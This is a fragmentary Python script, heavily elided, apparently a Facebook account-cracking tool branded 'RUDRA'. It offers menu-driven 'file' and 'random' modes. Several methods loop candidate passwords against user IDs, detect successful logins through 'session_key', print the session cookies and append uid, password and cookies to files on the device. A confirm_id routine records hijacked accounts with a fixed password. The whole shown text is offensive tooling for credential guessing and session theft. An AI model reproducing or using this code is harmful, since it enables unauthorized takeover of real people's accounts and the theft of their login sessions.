...
def main():
    ...
    print("\033[1;32m[6] EXIT RUDRA TOOL")       
    linex()
    RUDRA_xd = input(f"SELECT CORRECT OPTION : ")
    if RUDRA_xd == "1":
        file_crack()
    elif RUDRA_xd == "2":
        random_crack()
...
def file_crack():
    ...
    if ptype == "1":
        ...
        for x in range(ps_limit):
            ask_pw = input(f"\033[1;37m[{RUDRA+1}] ENTER PASSWORD : ")
...
def gmail():
    ...
    idz = []
    logo()
    print(f"[√]First : RUDRA, Aarushi, honey ")
...
def file_method(uid, name, pww, total_idz):
    ...
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[RUDRA- FILE] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for pw in pww:
            ...
            if "session_key" in data_json:
                ...
                print(f" {g}[RUDRA-OK] {uid} | {ps}")
                print(f" {w}[Cookies] > {g}{coki} ")
                open("/sdcard/RUDRA-FILE-OK.txt", "a").write(f"{uid}|{ps}|{coki}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                print(f" {r}[RUDRA-CP] {uid} | {ps}")
                open("/sdcard/RUDRA-FILE-CP.txt", "a").write(f"{uid}|{ps}\n")
                cpacc.append(uid)
                break
            else:
                continue
...
def random_method1(uid, pww, total_idz):
    ...
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[RUDRA-M1] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            ...
            if "session_key" in data_json:
                try:
                    ...
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f" {g}[RUDRA-OK] {uid} | {pw}")
                print(f" {w}[Cookies] > {g}{coki} ")
                open("/sdcard/RUDRA-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                okacc.append(uid)
                ...
                try:
                    ...
                    uid = uid
                print(f" {p}[RUDRA-CP] {uid} | {pw}")
                open("/sdcard/RUDRA-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
...
def random_method1(uid, pww, total_idz):
    ...
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[RUDRA-OLD] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
...
def confirm_id(mail,uid,otp,data,ses):
    try:
        ...
        if "checkpoint" in str(response.url):
            ...
            print(f"{X} SUCCESS - {G}{uid}|RUDRA@123|{cookie}")
            open("/sdcard/SUCCESS-OK-ID.txt","a").write(uid+"|RUDRA@123|"+cookie+"\n")
            linex()
    except Exception as e:
        linex()
        pass
...
def random_method2(uid, pww, total_idz):
    ...
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[RUDRA-M2] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
...
def random_method3(uid, pww, total_idz):
    ...
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[RUDRA-M3] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
...
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•
\033[1;37m[•] \033[1;37mVERSION    :\033[1;32m 2.0 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"""
